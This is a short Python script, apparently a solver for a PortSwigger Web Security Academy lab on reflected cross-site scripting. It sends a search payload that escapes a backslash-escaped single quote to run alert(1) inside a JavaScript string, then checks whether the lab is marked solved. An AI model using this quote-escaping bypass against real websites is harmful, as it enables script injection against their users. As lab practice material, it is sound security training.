import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped
# author: 0xyf


class XSS19:
    def __init__(self):
        self.lab_id = "0a6b003204106d9f80285d73009600b6"
        self.proxies = {"https": "http://127.0.0.1:8080"}

        self.url = f"https://{self.lab_id}.web-security-academy.net"

    def execute_request(self, payload):
        params = {"search": payload}
        r = requests.get(
            self.url,
            params=params,
            proxies=self.proxies,
            verify=False,
        )
        return r

    def reflected_xss(self):
        payload = "0xyf\\'-alert(1) //"
        r = self.execute_request(payload)

    def check_solved(self):
        sleep(2)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def solve(self):
        self.reflected_xss()
        self.check_solved()


def main():
    XSS19().solve()


if __name__ == "__main__":
    main()
